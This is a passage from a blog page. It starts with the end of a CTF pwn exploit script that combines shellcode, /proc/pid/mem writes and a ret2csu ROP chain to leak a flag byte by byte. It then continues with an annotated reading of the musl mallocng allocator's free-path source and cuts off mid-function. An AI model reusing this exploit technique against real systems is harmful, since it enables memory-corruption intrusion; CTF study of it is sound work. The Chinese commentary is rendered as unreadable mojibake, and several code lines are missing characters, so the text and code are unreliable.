/*exit(flag)*/</span></span><br><span class="line"><span class="string">    mov rdi, [rsi]</span></span><br><span class="line"><span class="string">    mov rax, 60</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(offset)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Maybe a Gift?&quot;</span>)</span><br><span class="line">    pay=asm(parent_shellcode)</span><br><span class="line">    pay=pay.ljust(<span class="number">0x300</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    pay+=asm(child_shellcode)</span><br><span class="line">    pay=pay.ljust(<span class="number">0x500</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    pay+=<span class="string">&#x27;/proc/&#x27;</span>+<span class="built_in">str</span>(father_pid+<span class="number">1</span>)+<span class="string">&#x27;/mem\x00&#x27;</span></span><br><span class="line">    sh.send(pay)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;A overflow?&quot;</span>)</span><br><span class="line">    csu1=<span class="number">0x40156A</span></span><br><span class="line">    csu2=<span class="number">0x401550</span></span><br><span class="line">    getpid_got=elf.got[<span class="string">&quot;getpid&quot;</span>]</span><br><span class="line">    pay=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(csu1)</span><br><span class="line">    pay+=p64(<span class="number">0x348e0</span>)+p64(getpid_got+<span class="number">0x3d</span>)</span><br><span class="line">    pay+=p64(<span class="number">0x404000</span>)+p64(<span class="number">0x1000</span>)</span><br><span class="line">    pay+=p64(<span class="number">7</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x40123c</span>)</span><br><span class="line">    pay+=p64(csu1)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">    pay+=p64(<span class="number">0x404000</span>)+p64(<span class="number">0x2000</span>)+p64(<span class="number">7</span>)</span><br><span class="line">    pay+=p64(<span class="number">0x404020</span>)+p64(csu2)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x4042E0</span>)</span><br><span class="line">    sh.send(pay)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    flag=sh.recv(<span class="number">1</span>)</span><br><span class="line">    sh.close()</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    s=exp(i)</span><br><span class="line">    flag+=s</span><br><span class="line">    <span class="keyword">if</span> s==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure>


















      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/20/musl%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-ctf%E5%89%8D%E4%B8%A4%E9%81%93pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/20/musl%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-ctf%E5%89%8D%E4%B8%A4%E9%81%93pwn/" class="post-title-link" itemprop="url">muslæºç é˜…è¯»&*ctfå‰ä¸¤é“pwn</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-04-20 14:35:40 / ä¿®æ”¹æ—¶é—´ï¼š14:36:30" itemprop="dateCreated datePublished" datetime="2022-04-20T14:35:40+08:00">2022-04-20</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="muslæºç é˜…è¯»-amp-ctf-å‰ä¸¤é“pwn"><a href="#muslæºç é˜…è¯»-amp-ctf-å‰ä¸¤é“pwn" class="headerlink" title="muslæºç é˜…è¯»&amp;*ctf å‰ä¸¤é“pwn"></a>muslæºç é˜…è¯»&amp;*ctf å‰ä¸¤é“pwn</h1><h2 id="0x1-æºç "><a href="#0x1-æºç " class="headerlink" title="0x1 æºç "></a>0x1 æºç </h2><h3 id="0x1-1-é‡è¦ç»“æ„ä½“"><a href="#0x1-1-é‡è¦ç»“æ„ä½“" class="headerlink" title="0x1.1 é‡è¦ç»“æ„ä½“"></a>0x1.1 é‡è¦ç»“æ„ä½“</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">truct chunk&#123;</span><br><span class="line"> <span class="keyword">char</span> prev_user_data[];</span><br><span class="line">    <span class="keyword">uint8_t</span> idx;  <span class="comment">//ç¬¬5bitä¸ºidxç¬¬å‡ ä¸ªchunk</span></span><br><span class="line">    <span class="keyword">uint16_t</span> offset; <span class="comment">//ä¸groupçš„åç§»</span></span><br><span class="line">    <span class="keyword">char</span> data[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span><span class="comment">// metaçš„åœ°å€</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">char</span> pad[UNIT - <span class="keyword">sizeof</span>(struct meta *) - <span class="number">1</span>];<span class="comment">// ä¿è¯0x10å­—èŠ‚å¯¹é½</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> storage[];<span class="meta"># chunk</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span><span class="comment">//åŒå‘é“¾è¡¨</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span><span class="comment">// è¿™é‡ŒæŒ‡å‘ç®¡ç†çš„group åœ°å€</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="keyword">uintptr_t</span> last_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">uintptr_t</span> freeable:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">uintptr_t</span> sizeclass:<span class="number">6</span>;</span><br><span class="line">    <span class="keyword">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="keyword">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> secret;<span class="comment">// å’Œmeta_area å¤´çš„check æ˜¯åŒä¸€ä¸ªå€¼ å°±æ˜¯æ ¡éªŒå€¼</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">    <span class="keyword">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> init_done;<span class="comment">//æ˜¯å¦åˆå§‹åŒ–æ ‡è®°</span></span><br><span class="line">    <span class="keyword">unsigned</span> mmap_counter;<span class="comment">// è®°å½•æœ‰å¤šå°‘mmap çš„å†…å­˜çš„æ•°é‡</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span><span class="comment">// è¢«free çš„meta å¤´ è¿™é‡Œmeta ç®¡ç†ä½¿ç”¨äº†é˜Ÿåˆ—å’ŒåŒå‘å¾ªç¯é“¾è¡¨</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span><span class="comment">//æŒ‡å‘å¯ç”¨metaæ•°ç»„</span></span><br><span class="line">    <span class="keyword">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *avail_meta_areas;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span><span class="comment">// è®°å½•ç€å¯ç”¨çš„meta</span></span><br><span class="line">    <span class="keyword">size_t</span> u sage_by_class[<span class="number">48</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> seq;</span><br><span class="line">    <span class="keyword">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">è¿™æ˜¯ä¸€ä¸ªæ˜ å°„å…³ç³»ï¼Œmeta.sizeclasså°±æ˜¯è¿™ä¸ªsize_classesçš„ä¸‹æ ‡ï¼Œé€šè¿‡è¿™ä¸ªä¸‹æ ‡</span><br><span class="line">æŠŠå¯¹åº”å€¼å–å‡ºæ¥ç„¶å*<span class="number">0x10</span>å°±æ˜¯è¿™ä¸ªmetaç®¡ç†çš„slotçš„å¤§å°äº†ï¼ŒåŒæ—¶malloc_context.active</span><br><span class="line">ä¹Ÿæ˜¯è¿™ä¸ªæ˜ å°„å…³ç³»</span><br><span class="line">onst <span class="keyword">uint16_t</span> size_classes[] = &#123;</span><br><span class="line">    <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line">    <span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>,</span><br><span class="line">    <span class="number">18</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">31</span>,</span><br><span class="line">    <span class="number">36</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">63</span>,</span><br><span class="line">    <span class="number">72</span>, <span class="number">84</span>, <span class="number">102</span>, <span class="number">127</span>,</span><br><span class="line">    <span class="number">146</span>, <span class="number">170</span>, <span class="number">204</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">292</span>, <span class="number">340</span>, <span class="number">409</span>, <span class="number">511</span>,</span><br><span class="line">    <span class="number">584</span>, <span class="number">682</span>, <span class="number">818</span>, <span class="number">1023</span>,</span><br><span class="line">    <span class="number">1169</span>, <span class="number">1364</span>, <span class="number">1637</span>, <span class="number">2047</span>,</span><br><span class="line">    <span class="number">2340</span>, <span class="number">2730</span>, <span class="number">3276</span>, <span class="number">4095</span>,</span><br><span class="line">    <span class="number">4680</span>, <span class="number">5460</span>, <span class="number">6552</span>, <span class="number">8191</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>0x1.2 free</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line">	<span class="comment">//é€šè¿‡chunkpå¾—åˆ°å¯¹åº”çš„meta</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);</span><br><span class="line">	<span class="keyword">int</span> idx = get_slot_index(p);</span><br><span class="line">	<span class="keyword">size_t</span> stride = get_stride(g);<span class="comment">//å¾—åˆ°è¿™ä¸ªmetaç®¡ç†çš„groupçš„slotçš„size</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *start = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *end = start + stride - IB;</span><br><span class="line">	<span class="comment">//*start = g-&gt;mem-&gt;storage(å¾—åˆ°groupä¸­ç¬¬ä¸€ä¸ªchunkåœ°å€) + stride*idx(åŠ ä¸Šå¯¹åº”chunkåç§»);</span></span><br><span class="line">    <span class="comment">// start å°±ä¸ºå¯¹åº”p(chunk)çš„èµ·å§‹åœ°å€</span></span><br><span class="line">    <span class="comment">// end å¯¹åº”ç»“æŸåœ°å€</span></span><br><span class="line">	get_nominal_size(p, end);</span><br><span class="line">    <span class="comment">//selfå¾—åˆ°bitmapå¯¹åº”çš„ä½ç½®ï¼Œallæ˜¯å¾—åˆ°bitmapå…¨æ˜¯1çš„æ•°</span></span><br><span class="line">	<span class="keyword">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;idx, all = (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//æŠŠoffssetè®¾ç½®ä¸º0xffï¼ŒæŠŠidxæ¸…é›¶</span></span><br><span class="line">	((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p)[<span class="number">-3</span>] = <span class="number">255</span>;</span><br><span class="line">	*(<span class="keyword">uint16_t</span> *)((<span class="keyword">char</span> *)p<span class="number">-2</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//æ²¡çœ‹æ‡‚åœ¨å¹²å•¥</span></span><br><span class="line">	<span class="keyword">if</span> (((<span class="keyword">uintptr_t</span>)(start<span class="number">-1</span>) ^ (<span class="keyword">uintptr_t</span>)end) &gt;= <span class="number">2</span>*PGSZ &amp;&amp; g-&gt;last_idx) &#123;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">char</span> *base = start + (-(<span class="keyword">uintptr_t</span>)start &amp; (PGSZ<span class="number">-1</span>));</span><br><span class="line">		<span class="keyword">size_t</span> len = (end-base) &amp; -PGSZ;</span><br><span class="line">		<span class="keyword">if</span> (len) madvise(base, len, MADV_FREE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="keyword">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">		<span class="keyword">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">        <span class="comment">//maskä¸­ä¸º1ä»£è¡¨æœªåˆ†é…æˆ–è€…å·²åˆ†é…ä¸”å·²freeçš„chunkï¼Œ</span></span><br><span class="line">        <span class="comment">//ä¸º0ä»£è¡¨å·²åˆ†é…ä½†è¿˜æ²¡freeçš„cuhnk</span></span><br><span class="line">		<span class="keyword">uint32_t</span> mask = freed | avail;</span><br><span class="line">        <span class="comment">//é˜²æ­¢doublefree</span></span><br><span class="line">		assert(!(mask&amp;self));</span><br><span class="line">		<span class="keyword">if</span> (!freed || mask+self==all) <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (!MT)</span><br><span class="line">			g-&gt;freed_mask = freed+self;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	wrlock();</span><br><span class="line">    <span class="comment">//nontrivial_freeæ˜¯å…³é”®çš„å‡½æ•°</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br><span class="line">	unlock();</span><br><span class="line">	<span class="keyword">if</span> (mi.len) munmap(mi.base, mi.len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct mapinfo <span class="title">nontrivial_free</span><span class="params">(struct meta *g, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">	<span class="keyword">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="keyword">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line">    <span class="comment">//è¿›å…¥è¿™ä¸ªæ¡ä»¶çš„æƒ…å†µæœ‰ä¸¤ç§</span></span><br><span class="line">    <span class="comment">//1:åªæœ‰ä¸€ä¸ªchunkè¢«åˆ†é…ä¸”è¿™ä¸ªchunkæ­£æ˜¯è¦è¢«freeçš„chunk</span></span><br><span class="line">    <span class="comment">//2:é™¤äº†ä¸€ä¸ªchunkå…¶ä½™å…¨è¢«free,qä¸”è¿™ä¸ªchunkæ­£æ˜¯è¦è¢«freeçš„chunk</span></span><br><span class="line">	<span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">			assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">			<span class="keyword">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">			dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">			<span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">				activate_group(ctx.active[sc]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> free_group(g);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">		assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">		<span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">		<span class="comment">// after last available slot was taken.</span></span><br><span class="line">		<span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line">			<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line">	<span class="keyword">return</span> (struct mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">okay_to_free</span><span class="params">(struct meta *g)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="comment">//freeable=1æ ¹æ®æºç  ä»£è¡¨metaå¦å¯ä»¥è¢«å›æ”¶ freeable=0 ä»£è¡¨ä¸å¯ä»¥ =1 ä»£è¡¨å¯ä»¥</span></span><br><span class="line">	<span class="keyword">if</span> (!g-&gt;freeable) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (sc &gt;= <span class="number">48</span> || get_stride(g) &lt; UNIT*size_classes[sc])</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span> (!g-&gt;maplen) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//è¦fake_metaå®ŒæˆæŒ‡é’ˆäº’ç›¸ï¼Œé‚£è¿™ä¸ªæ¡ä»¶å¤©ç„¶æ»¡è¶³</span></span><br><span class="line">	<span class="keyword">if</span> (g-&gt;next != g) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span> (!is_bouncing(sc)) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">size_t</span> cnt = g-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">size_t</span> usage = ctx.usage_by_class[sc];</span><br><span class="line">	<span class="keyword">if</span> (<span class="number">9</span>*cnt &lt;= usage &amp;&amp; cnt &lt; <span class="number">20</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°ä¼šæ£€æŸ¥chunk,group,metaå’Œmeta_areaç»“æ„ä½“ï¼Œæ¯”è¾ƒé‡è¦</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct meta *<span class="title">get_meta</span><span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	assert(!((<span class="keyword">uintptr_t</span>)p &amp; <span class="number">15</span>));<span class="comment">//åå…­å­—èŠ‚å¯¹é½</span></span><br><span class="line">	<span class="comment">//è·å–slotçš„åç§»offset,offset*0x10æ˜¯çœŸå®åç§»</span></span><br><span class="line">	<span class="keyword">int</span> offset = *(<span class="keyword">const</span> <span class="keyword">uint16_t</span> *)(p - <span class="number">2</span>);</span><br><span class="line">	<span class="comment">//è·å–è¿™ä¸ªslotçš„idx</span></span><br><span class="line">	<span class="keyword">int</span> index = get_slot_index(p);</span><br><span class="line">			<span class="comment">//æ£€æŸ¥chunkçš„å¾€å‰æ•°ç¬¬å››ä¸ªå­—èŠ‚æ˜¯å¦ä¸º0ï¼Œä¸ä¸º0æŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">		<span class="comment">//è¿™ä¸ªå­—èŠ‚æ˜¯åˆ¤æ–­chunkæ˜¯å¦è¢«æº¢å‡ºçš„æ ‡å¿—ä½ã€‚</span></span><br><span class="line">	<span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">		assert(!offset);</span><br><span class="line">		offset = *(<span class="keyword">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">		assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//é€šè¿‡offsetè·å–groupçš„é¦–åœ°å€</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="keyword">const</span> <span class="keyword">void</span> *)(p - <span class="number">0x10</span>*offset - <span class="number">0x10</span>);</span><br><span class="line">	<span class="comment">//è·å–metaåœ°å€ï¼Œgroupçš„å‰å…«ä¸ªå­—èŠ‚æ˜¯æŒ‡å‘metaç»“æ„çš„åœ°å€</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br><span class="line">	assert(meta-&gt;mem == base);</span><br><span class="line">	assert(index &lt;= meta-&gt;last_idx);</span><br><span class="line">	<span class="comment">//å¦‚æœè¿™ä¸ªchunkæ²¡æœ‰è¢«ä½¿ç”¨å°±åˆ†é…å°±ä¼šæŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">	assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	<span class="comment">//å¦‚æœè¿™ä¸ªchunkè¢«freeè¿‡å†è¿›è¡Œfreeå°±ä¼šæŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">	assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	<span class="comment">//é€šè¿‡metaå¾—åˆ°meta_area</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="keyword">void</span> *)((<span class="keyword">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">	<span class="comment">//å¯¹è¿™ä¸ªmeta_areaè¿›è¡Œæ£€æŸ¥</span></span><br><span class="line">	assert(area-&gt;check == ctx.secret);</span><br><span class="line">	<span class="keyword">if</span> 